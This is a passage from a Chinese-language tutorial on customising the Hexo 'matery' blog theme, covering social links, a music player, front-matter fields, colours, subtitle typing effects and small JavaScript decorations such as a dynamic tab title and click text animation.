&#x2F;layout&#x2F;_partial&#x2F;footer.ejs 文件中，包括站点、使用的主题、访问量等。</p><h5 id="2-17-修改社交链接"><a href="#2-17-修改社交链接" class="headerlink" title="2.17 修改社交链接"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-17-%E4%BF%AE%E6%94%B9%E7%A4%BE%E4%BA%A4%E9%93%BE%E6%8E%A5" title="2.17 修改社交链接"></a>2.17 修改社交链接</h5><p>  在主题的 _config.yml 文件中，默认支持 QQ、GitHub 和邮箱等的配置，你可以在主题文件的 &#x2F;layout&#x2F;_partial&#x2F;social-link.ejs 文件中，新增、修改你需要的社交链接地址，增加链接可参考如下代码：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% <span class="keyword">if</span> (theme.socialLink.github) &#123; %&gt; &lt;a href=<span class="string">&quot;&lt;%= theme.socialLink.github %&gt;&quot;</span> class=<span class="string">&quot;tooltipped&quot;</span> target=<span class="string">&quot;_blank&quot;</span> data-tooltip=<span class="string">&quot;访问我的GitHub&quot;</span> data-position=<span class="string">&quot;top&quot;</span> data-delay=<span class="string">&quot;50&quot;</span>&gt; &lt;i class=<span class="string">&quot;fab fa-github&quot;</span>&gt;&lt;/i&gt; &lt;/a&gt; &lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>  其中，社交图标（如：fa-github）你可以在 Font Awesome 中搜索找到。以下是常用社交图标的标识，供你参考：</p><p>Facebook: fab fa-facebook<br>Twitter: fab fa-twitter<br>Google-plus: fab fa-google-plus<br>Linkedin: fab fa-linkedin<br>Tumblr: fab fa-tumblr<br>Medium: fab fa-medium<br>Slack: fab fa-slack<br>Sina Weibo: fab fa-weibo<br>Wechat: fab fa-weixin<br>QQ: fab fa-qq<br>Zhihu: fab fa-zhihu<br>  <strong>注意:</strong> 本主题中使用的 Font Awesome 版本为 5.11.0。</p><h5 id="2-18-修改打赏的二维码图片"><a href="#2-18-修改打赏的二维码图片" class="headerlink" title="2.18 修改打赏的二维码图片"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-18-%E4%BF%AE%E6%94%B9%E6%89%93%E8%B5%8F%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%9B%BE%E7%89%87" title="2.18 修改打赏的二维码图片"></a>2.18 修改打赏的二维码图片</h5><p>  在主题文件的 source&#x2F;medias&#x2F;reward 文件中，你可以替换成你的的微信和支付宝的打赏二维码图片。</p><h5 id="2-19-配置音乐播放器（可选的）"><a href="#2-19-配置音乐播放器（可选的）" class="headerlink" title="2.19 配置音乐播放器（可选的）"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-19-%E9%85%8D%E7%BD%AE%E9%9F%B3%E4%B9%90%E6%92%AD%E6%94%BE%E5%99%A8%EF%BC%88%E5%8F%AF%E9%80%89%E7%9A%84%EF%BC%89" title="2.19 配置音乐播放器（可选的）"></a>2.19 配置音乐播放器（可选的）</h5><p>  要支持音乐播放，就必须开启音乐的播放配置和音乐数据的文件。</p><p>  首先，在你的博客 source 目录下的 _data 目录（没有的话就新建一个）中新建 musics.json 文件，文件内容如下所示：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123; <span class="string">&quot;name&quot;</span>: <span class="string">&quot;五月雨变奏电音&quot;</span>, <span class="string">&quot;artist&quot;</span>: <span class="string">&quot;AnimeVibe&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://xxx.com/music1.mp3&quot;</span>, <span class="string">&quot;cover&quot;</span>: <span class="string">&quot;http://xxx.com/music-cover1.png&quot;</span> &#125;, &#123; <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Take me hand&quot;</span>, <span class="string">&quot;artist&quot;</span>: <span class="string">&quot;DAISHI DANCE,Cecile Corbel&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;/medias/music/music2.mp3&quot;</span>, <span class="string">&quot;cover&quot;</span>: <span class="string">&quot;/medias/music/cover2.png&quot;</span> &#125;, &#123; <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Shape of You&quot;</span>, <span class="string">&quot;artist&quot;</span>: <span class="string">&quot;J.Fla&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://xxx.com/music3.mp3&quot;</span>, <span class="string">&quot;cover&quot;</span>: <span class="string">&quot;http://xxx.com/music-cover3.png&quot;</span> &#125;]</span><br></pre></td></tr></table></figure><p>  <strong>注：</strong>以上 JSON 中的属性：name、artist、url、cover 分别表示音乐的名称、作者、音乐文件地址、音乐封面。</p><p>  然后，在主题的 _config.yml 配置文件中激活配置即可：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 是否在首页显示音乐. music: enable: true showTitle: false title: 听听音乐 fixed: false # 是否开启吸底模式 autoplay: false # 是否自动播放 theme: &#x27;#42b983&#x27; loop: &#x27;all&#x27; # 音频循环播放, 可选值: &#x27;all&#x27;, &#x27;one&#x27;, &#x27;none&#x27; order: &#x27;list&#x27; # 音频循环顺序, 可选值: &#x27;list&#x27;, &#x27;random&#x27; preload: &#x27;auto&#x27; # 预加载，可选值: &#x27;none&#x27;, &#x27;metadata&#x27;, &#x27;auto&#x27; volume: 0.7 # 默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效 listFolded: false # 列表默认折叠 listMaxHeight: # 列表最大高度</span></span><br></pre></td></tr></table></figure><h4 id="3-文章-Front-matter-介绍"><a href="#3-文章-Front-matter-介绍" class="headerlink" title="3. 文章 Front-matter 介绍"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#3-%E6%96%87%E7%AB%A0-Front-matter-%E4%BB%8B%E7%BB%8D" title="3. 文章 Front-matter 介绍"></a>3. 文章 Front-matter 介绍</h4><p>  Front-matter 选项详解<br>  Front-matter 选项中的所有内容均为非必填的。但我仍然建议至少填写 title 和 date 的值。</p><p>  您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则<br>  以下为文章的 Front-matter 示例。</p><p>  最简示例</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--- title: typora-vue-theme主题介绍 <span class="built_in">date</span>: 2018-09-07 09:25:00 ---</span><br></pre></td></tr></table></figure><p>  最全示例</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--- title: typora-vue-theme主题介绍 <span class="built_in">date</span>: 2022-05-02 09:25:00 author: CrazyYu img: /source/images/xxx.jpg top: <span class="literal">true</span> cover: <span class="literal">true</span> coverImg: /images/1.jpg password: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92 toc: <span class="literal">false</span> mathjax: <span class="literal">false</span> summary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要 categories: Markdown tags: - Typora - Markdown ---</span><br></pre></td></tr></table></figure><h4 id="4-效果截图"><a href="#4-效果截图" class="headerlink" title="4. 效果截图"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#4-%E6%95%88%E6%9E%9C%E6%88%AA%E5%9B%BE" title="4. 效果截图"></a>4. 效果截图</h4><p>  最新版本进行了优化更新，效果图与最初的效果图有差别，下面的图不是最新版本的。  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/46.jpg" alt="46"></p><p><strong>46</strong></p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/47.jpg" alt="47"></p><p><strong>47</strong></p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/48.jpg" alt="48"></p><p><strong>48</strong></p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/49.jpg" alt="49"></p><p><strong>49</strong></p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/50.jpg" alt="50"></p><p><strong>50</strong></p><h4 id="5-自定制修改"><a href="#5-自定制修改" class="headerlink" title="5. 自定制修改"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#5-%E8%87%AA%E5%AE%9A%E5%88%B6%E4%BF%AE%E6%94%B9" title="5. 自定制修改"></a>5. 自定制修改</h4><p>  <strong>我认为个人博客应该都有自己的风格和特色。</strong>如果本主题中的诸多功能和主题色彩你不满意，可以在主题中自定义修改，很多更自由的功能和细节点的修改难以在主题的 _config.yml 中完成，需要修改源代码才来完成。以下列出了可能对你有用的地方：</p><h5 id="5-1-修改主题颜色"><a href="#5-1-修改主题颜色" class="headerlink" title="5.1 修改主题颜色"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#5-1-%E4%BF%AE%E6%94%B9%E4%B8%BB%E9%A2%98%E9%A2%9C%E8%89%B2" title="5.1 修改主题颜色"></a>5.1 修改主题颜色</h5><p>  在主题文件的 &#x2F;source&#x2F;css&#x2F;matery.css 文件中，搜索 .bg-color 来修改背景颜色：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/* 整体背景颜色，包括导航、移动端的导航、页尾、标签页等的背景颜色. */ .bg-color &#123; background-image: linear-gradient(to right, <span class="comment">#4cbf30 0%, #0f9d58 100%); &#125; /*如果想去掉banner图的颜色渐变效果，请将以下的css属性注释掉或者删除掉即可*/ @-webkit-keyframes rainbow &#123; /* 动态切换背景颜色. */ &#125; @keyframes rainbow &#123; /* 动态切换背景颜色. */ &#125;</span></span><br></pre></td></tr></table></figure><p>  你可以直接在 &#x2F;source&#x2F;medias&#x2F;banner 文件夹中更换你喜欢的 banner 图片，主题代码中是每天动态切换一张，只需 7 张即可。如果你会 JavaScript 代码，可以修改成你自己喜欢切换逻辑，如：随机切换等，banner 切换的代码位置在 &#x2F;layout&#x2F;_partial&#x2F;bg-cover-content.ejs 文件的 代码中：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;.bg-cover&#x27;</span>).css(<span class="string">&#x27;background-image&#x27;</span>, <span class="string">&#x27;url(/medias/banner/&#x27;</span> + new Date().getDay() + <span class="string">&#x27;.jpg)&#x27;</span>);</span><br></pre></td></tr></table></figure><p>  在 &#x2F;source&#x2F;medias&#x2F;featureimages 文件夹中默认有 24 张特色图片，你可以再增加或者减少，并需要在 _config.yml 做同步修改。</p><p>  如果想改为每小时或者每分钟切换banner图的话，需要将getDay()改为getHours()或者getMinutes()即可。</p><h5 id="5-3-修改网站相关信息"><a href="#5-3-修改网站相关信息" class="headerlink" title="5.3 修改网站相关信息"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#5-3-%E4%BF%AE%E6%94%B9%E7%BD%91%E7%AB%99%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF" title="5.3 修改网站相关信息"></a>5.3 修改网站相关信息</h5><p>  首先看一个图，如下：  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/51.jpg" alt="51"></p><p><strong>51</strong></p><p>  紧接着放上相关的配置文件信息：</p><p>1.网站信息的修改</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这是根目录下的配置文件信息 title: CrazyYu&#x27;s Blog #这是网站标题 subtitle: &#x27;Smile Life&#x27; #这是网站副标题subtitler # 下面两个description,keywords，需要填上，如果想让搜索引擎收录，这个做SEO优化必不可忽视的两个属性 description: &#x27;个人博客&#x27; #网站描述 keywords: [HTML, CSS, JavaScript, JQuery, React, Vue.js等] #网站的关键词 author: Crazy Yuchi #作者，文章版权所显示的 language: zh-cn #网站语言，不填写，默认为英文 timezone: &#x27;&#x27; #时区，可以不填写</span></span><br></pre></td></tr></table></figure><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这是主题配置文件的相关信息 # 配置网站favicon和网站LOGO # 可以用的CDN，也可以使用本地文件 favicon: /favicon.png logo: /medias/logo.png # 网站副标题，打字效果 # 如果有符号 ‘ ，请在 ’ 前面加上 \ subtitle: enable: true loop: true # 是否循环 showCursor: true # 是否显示光标 startDelay: 300 # 开始延迟 typeSpeed: 100 # 打字速度 backSpeed: 50 # 删除速度 sub1: 从来没有真正的绝境, 只有心灵的迷途 sub2: Never really desperate, only the lost of the soul</span></span><br></pre></td></tr></table></figure><p>  <strong>注意：</strong></p><p>  网站打字效果副标题默认有两个，即sub1和sub2，如果想写多个，则需要修改两处地方，首先修改配置文件，如上面所示，在sub1和sub2后面继续添加即可，然后在去主题目录下的layout文件夹下的_partial文件夹，修改bg-cover-content.ejs文件，大约在12行左右，如下面所示：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=<span class="string">&quot;description center-align&quot;</span>&gt; &lt;% <span class="keyword">if</span> (theme.subtitle.enable) &#123; %&gt; &lt;span <span class="built_in">id</span>=<span class="string">&quot;subtitle&quot;</span>&gt;&lt;/span&gt; &lt;script src=<span class="string">&quot;https://cdn.jsdelivr.net/npm/typed.js@2.0.11&quot;</span>&gt;&lt;/script&gt; &lt;script&gt; var typed = new Typed(<span class="string">&quot;#subtitle&quot;</span>, &#123; strings: [<span class="string">&#x27;&lt;%= theme.subtitle.sub1 %&gt;&#x27;</span>, <span class="string">&#x27;&lt;%= theme.subtitle.sub2 %&gt;&#x27;</span>, <span class="string">&#x27;&lt;%= theme.subtitle.sub3 %&gt;&#x27;</span>, <span class="string">&#x27;&lt;%= theme.subtitle.sub4 %&gt;&#x27;</span>, <span class="string">&#x27;&lt;%= theme.subtitle.sub5 %&gt;&#x27;</span>, <span class="string">&#x27;&lt;%= theme.subtitle.sub6 %&gt;&#x27;</span>], startDelay: &lt;%= theme.subtitle.startDelay %&gt;, typeSpeed: &lt;%= theme.subtitle.typeSpeed %&gt;, loop: &lt;%= theme.subtitle.loop %&gt;, backSpeed: &lt;%= theme.subtitle.backSpeed %&gt;, showCursor: &lt;%= theme.subtitle.showCursor %&gt; &#125;); &lt;/script&gt; &lt;% &#125; <span class="keyword">else</span> &#123; %&gt; &lt;%= config.description %&gt; &lt;% &#125; %&gt; &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>2.社交链接的修改<br>  默认的配置信息为：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首页 banner 中的第二行个人信息配置，留空即不启用 socialLink: github: https://github.com/CrazyYuchi email: 931846427@qq.com facebook: # https://www.facebook.com/profile.php?id=100080256978101 twitter: # https://twitter.com/ qq: 931846427 weibo: # https://weibo.com//u/5629150839 zhihu: # https://www.zhihu.com/ rss: true # true、false</span></span><br></pre></td></tr></table></figure><p>  如果想添加简书，CSDN，掘金，博客园等等，需要在主题配置文件添加相关配置，可以进行如下配置(例如)：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socialLink: qq: 931846427 weixin: ***.png github: https://github.com/CrazyYuchi email: mailto:931846427@qq.com facebook: <span class="comment"># https://www.facebook.com/xxx twitter: # https://twitter.com/xxx weibo: # https://weibo.com/xxx zhihu: https://www.zhihu.com/people/xuan-tian-40-64/activities juejin: https://juejin.im/user/5a902053f265da4e7527ae71/activities csdn: https://blog.csdn.net/victoryxa jianshu: https://www.jianshu.com/u/3b3856869772 cnblogs: https://www.cnblogs.com/yafine/ rss: true # true、false</span></span><br></pre></td></tr></table></figure><p>  其中的weixin我是用的图片链接，会跳转到一个新的标签页，之后还需要修改ejs文件，文件在主题目录下的layout文件夹下的_partial文件夹，修改social-link.ejs，添加相关的配置，个人添加的配置如下(例如)：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% <span class="keyword">if</span> (theme.socialLink.jianshu) &#123; %&gt; &lt;a href=<span class="string">&quot;&lt;%= theme.socialLink.jianshu %&gt;&quot;</span> class=<span class="string">&quot;tooltipped&quot;</span> target=<span class="string">&quot;_blank&quot;</span> data-tooltip=<span class="string">&quot;关注我的简书: &lt;%= theme.socialLink.jianshu %&gt;&quot;</span> data-position=<span class="string">&quot;top&quot;</span> data-delay=<span class="string">&quot;50&quot;</span>&gt; &lt;i class=<span class="string">&quot;fab fa-jianshu&quot;</span>&gt;简&lt;/i&gt; &lt;/a&gt; &lt;% &#125; %&gt; &lt;% <span class="keyword">if</span> (theme.socialLink.csdn) &#123; %&gt; &lt;a href=<span class="string">&quot;&lt;%= theme.socialLink.csdn %&gt;&quot;</span> class=<span class="string">&quot;tooltipped&quot;</span> target=<span class="string">&quot;_blank&quot;</span> data-tooltip=<span class="string">&quot;关注我的CSDN: &lt;%= theme.socialLink.csdn %&gt;&quot;</span> data-position=<span class="string">&quot;top&quot;</span> data-delay=<span class="string">&quot;50&quot;</span>&gt; &lt;i class=<span class="string">&quot;fab fa-csdn&quot;</span>&gt;C&lt;/i&gt; &lt;/a&gt; &lt;% &#125; %&gt; &lt;% <span class="keyword">if</span> (theme.socialLink.juejin) &#123; %&gt; &lt;a href=<span class="string">&quot;&lt;%= theme.socialLink.juejin %&gt;&quot;</span> class=<span class="string">&quot;tooltipped&quot;</span> target=<span class="string">&quot;_blank&quot;</span> data-tooltip=<span class="string">&quot;关注我的掘金: &lt;%= theme.socialLink.juejin %&gt;&quot;</span> data-position=<span class="string">&quot;top&quot;</span> data-delay=<span class="string">&quot;50&quot;</span>&gt; &lt;i class=<span class="string">&quot;fab fa-juejin&quot;</span>&gt;掘&lt;/i&gt; &lt;/a&gt; &lt;% &#125; %&gt; &lt;% <span class="keyword">if</span> (theme.socialLink.cnblogs) &#123; %&gt; &lt;a href=<span class="string">&quot;&lt;%= theme.socialLink.cnblogs %&gt;&quot;</span> class=<span class="string">&quot;tooltipped&quot;</span> target=<span class="string">&quot;_blank&quot;</span> data-tooltip=<span class="string">&quot;关注我的博客园: &lt;%= theme.socialLink.cnblogs %&gt;&quot;</span> data-position=<span class="string">&quot;top&quot;</span> data-delay=<span class="string">&quot;50&quot;</span>&gt; &lt;i class=<span class="string">&quot;fab fa-juejin&quot;</span>&gt;博&lt;/i&gt; &lt;/a&gt; &lt;% &#125; %&gt; &lt;% <span class="keyword">if</span> (theme.socialLink.weixin) &#123; %&gt; &lt;a href=<span class="string">&quot;&lt;%= theme.socialLink.weixin %&gt;&quot;</span> class=<span class="string">&quot;tooltipped&quot;</span> target=<span class="string">&quot;_blank&quot;</span> data-tooltip=<span class="string">&quot;微信联系我: &lt;%= theme.socialLink.weixin %&gt;&quot;</span> data-position=<span class="string">&quot;top&quot;</span> data-delay=<span class="string">&quot;50&quot;</span>&gt; &lt;i class=<span class="string">&quot;fab fa-weixin&quot;</span>&gt;&lt;/i&gt; &lt;/a&gt; &lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><h3 id="六、hexo博客美化（DIY）"><a href="#六、hexo博客美化（DIY）" class="headerlink" title="六、hexo博客美化（DIY）"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#%E5%85%AD%E3%80%81hexo%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96%EF%BC%88DIY%EF%BC%89" title="六、hexo博客美化（DIY）"></a>六、hexo博客美化（DIY）</h3><p>QQ 交流群(及文件下载):478404205<br>  主题DIY会涉及到js文件和css文件等的修改，个人建议新增的js文件放在themes&#x2F;matery&#x2F;layout&#x2F;layout.ejs这个文件下，这样会稍微加快博客访问的速度。不想花钱最好的方式是使用cdn.jsdeliver。以后会说到。</p><h4 id="1-动态标题"><a href="#1-动态标题" class="headerlink" title="1. 动态标题"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#1-%E5%8A%A8%E6%80%81%E6%A0%87%E9%A2%98" title="1. 动态标题"></a>1. 动态标题</h4><p>  先放上效果图再说：  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/52.jpg" alt="52"></p><p><strong>52</strong></p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/53.jpg" alt="53"></p><p><strong>53</strong></p><p>  实现方法，直接在themes&#x2F;matery&#x2F;layout&#x2F;layout.ejs文件中添加如下代码：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt; var OriginTitile=document.title,st; document.addEventListener(<span class="string">&quot;visibilitychange&quot;</span>,<span class="function"><span class="title">function</span></span>()&#123; document.hidden?(document.title=<span class="string">&quot;ヽ(●-`Д´-)ノ你要玩捉迷藏嘛&quot;</span>,clearTimeout(st)):(document.title=<span class="string">&quot;(Ő∀Ő3)ノ好哦！&quot;</span>,st=setTimeout(<span class="function"><span class="title">function</span></span>()&#123;document.title=OriginTitile&#125;,3e3)) &#125;) &lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="2-修改导航栏颜色以及透明效果"><a href="#2-修改导航栏颜色以及透明效果" class="headerlink" title="2. 修改导航栏颜色以及透明效果"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-%E4%BF%AE%E6%94%B9%E5%AF%BC%E8%88%AA%E6%A0%8F%E9%A2%9C%E8%89%B2%E4%BB%A5%E5%8F%8A%E9%80%8F%E6%98%8E%E6%95%88%E6%9E%9C" title="2. 修改导航栏颜色以及透明效果"></a>2. 修改导航栏颜色以及透明效果</h4><p>  打开themes&#x2F;matery&#x2F;source&#x2F;css&#x2F;matery.css文件，大约在250行，有一个.bg-color属性，修改其属性值即可，代码如下：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.bg-color &#123; background-image: linear-gradient(to right, <span class="comment">#4cbf30 0%, #0f9d58 100%); //修改成自己喜欢的颜色值 opacity: 0.8; //透明效果 值范围 0~1，看情况自己修改 &#125;</span></span><br></pre></td></tr></table></figure><h4 id="3-添加动态诗词"><a href="#3-添加动态诗词" class="headerlink" title="3. 添加动态诗词"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#3-%E6%B7%BB%E5%8A%A0%E5%8A%A8%E6%80%81%E8%AF%97%E8%AF%8D" title="3. 添加动态诗词"></a>3. 添加动态诗词</h4><p>  采用的是今日诗词，每次返回一句诗词，根据时间、地点、天气、事件智能推荐。官网有API文档，可以去看一下，有多种安装方式，最简单的方式就是从官网获取代码，在&#x2F;themes&#x2F;matery&#x2F;layout&#x2F;_partial&#x2F;head.ejs添加下面的一行代码：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://sdk.jinrishici.com/v2/browser/jinrishici.js&quot;</span> charset=<span class="string">&quot;utf-8&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>  然后再将&#x2F;themes&#x2F;matery&#x2F;layout&#x2F;_partial&#x2F;bg-cover-content.ejs中的&lt;%&#x3D; config.description %&gt;修改为把&lt;%&#x3D; config.description %&gt;改为&lt;%- ‘正在加载今日诗词….‘ %&gt;，这个使用前提是将主题配置文件的subtitle的值改为false。</p><h4 id="4-鼠标点击文字特效"><a href="#4-鼠标点击文字特效" class="headerlink" title="4. 鼠标点击文字特效"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#4-%E9%BC%A0%E6%A0%87%E7%82%B9%E5%87%BB%E6%96%87%E5%AD%97%E7%89%B9%E6%95%88" title="4. 鼠标点击文字特效"></a>4. 鼠标点击文字特效</h4><p>  实现方法，引入js文件，在主题文件下的&#x2F;source&#x2F;js&#x2F;下新建click_show_text.js，其代码如下：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var a_idx = 0; jQuery(document).ready(<span class="keyword">function</span> ($) &#123; $(<span class="string">&quot;body&quot;</span>).click(<span class="keyword">function</span> (e) &#123; var a = new Array(<span class="string">&quot;富强&quot;</span>, <span class="string">&quot;民主&quot;</span>, <span class="string">&quot;文明&quot;</span>, <span class="string">&quot;和谐&quot;</span>, <span class="string">&quot;自由&quot;</span>, <span class="string">&quot;平等&quot;</span>, <span class="string">&quot;公正&quot;</span>, <span class="string">&quot;法治&quot;</span>, <span class="string">&quot;爱国&quot;</span>, <span class="string">&quot;敬业&quot;</span>, <span class="string">&quot;诚信&quot;</span>, <span class="string">&quot;友善&quot;</span>); var <span class="variable">$i</span> = $(<span class="string">&quot;&lt;span/&gt;&quot;</span>).text(a[a_idx]); a_idx = (a_idx + 1) % a.length; var x = e.pageX, y = e.pageY; <span class="variable">$i</span>.css(&#123; <span class="string">&quot;z-index&quot;</span>: 5, <span class="string">&quot;top&quot;</span>: y - 20, <span class="string">&quot;left&quot;</span>: x, <span class="string">&quot;position&quot;</span>: <span class="string">&quot;absolute&quot;</span>, <span class="string">&quot;font-weight&quot;</span>: <span class="string">&quot;bold&quot;</span>, <span class="string">&quot;color&quot;</span>: <span class="string">&quot;#FF0000&quot;</span> &#125;); $(<span class="string">&quot;body&quot;</span>).append(<span class="variable">$i</span>); <span class="variable">$i</span>.animate(&#123; <span class="string">&quot;top&quot;</span>: y - 180, <span class="string">&quot;opacity&quot;</span>: 0 &#125;, 3000, <span class="function"><span class="title">function</span></span> () &#123; <span class="variable">$i</span>.remove(); &#125;); &#125;); setTimeout(<span class="string">&#x27;delay()&#x27;</span>, 2000); &#125;); <span class="keyword">function</span> <span class="function"><span class="title">delay</span></span>() &#123; $(<span class="string">&quot;.buryit&quot;</span>).removeAttr(<span class="string">&quot;onclick&quot;</span>); &#125;</span><br></pre></td></tr></table></figure><h4 id="5-修改原有相册"><a href="#5-修改原有相册" class="headerlink" title="5. 修改原有相册"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#5-%E4%BF%AE%E6%94%B9%E5%8E%9F%E6%9C%89%E7%9B%B8%E5%86%8C" title="5. 修改原有相册"></a>5. 修改原有相册</h4><p>  参考教程：后面专门出一期</p><h4 id="6-添加天气小插件"><a href="#6-添加天气小插件" class="headerlink" title="6. 添加天气小插件"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#6-%E6%B7%BB%E5%8A%A0%E5%A4%A9%E6%B0%94%E5%B0%8F%E6%8F%92%E4%BB%B6" title="6. 添加天气小插件"></a>6. 添加天气小插件</h4><p>  首先去<a href="https://cj.weather.com.cn/plugin/pc">中国天气官网</a>，配置自己的插件，选择自定义插件—&gt;自定义样式——&gt;生成代码，然后会生成一段代码，复制粘贴到 themes&#x2F;matery&#x2F;layout&#x2F;layout.ejs即可。</p><h4 id="7-关于我页面添加个人简历"><a href="#7-关于我页面添加个人简历" class="headerlink" title="7. 关于我页面添加个人简历"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#7-%E5%85%B3%E4%BA%8E%E6%88%91%E9%A1%B5%E9%9D%A2%E6%B7%BB%E5%8A%A0%E4%B8%AA%E4%BA%BA%E7%AE%80%E5%8E%86" title="7. 关于我页面添加个人简历"></a>7. 关于我页面添加个人简历</h4><p>  打开theme&#x2F;matery&#x2F;layout&#x2F;about.ejs文件，大约在13行。有一个div class&#x3D;”card”标签，找出其对应结尾的标签，大约在61行左右，然后在新增如下代码：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=<span class="string">&quot;card&quot;</span>&gt; &lt;div class=<span class="string">&quot;card-content&quot;</span>&gt; &lt;div class=<span class="string">&quot;card-content article-card-content&quot;</span>&gt; &lt;div class=<span class="string">&quot;title center-align&quot;</span> data-aos=<span class="string">&quot;zoom-in-up&quot;</span>&gt; &lt;i class=<span class="string">&quot;fa fa-address-book&quot;</span>&gt;&lt;/i&gt;&amp;nbsp;&amp;nbsp;&lt;%- __(<span class="string">&#x27;个人简历&#x27;</span>) 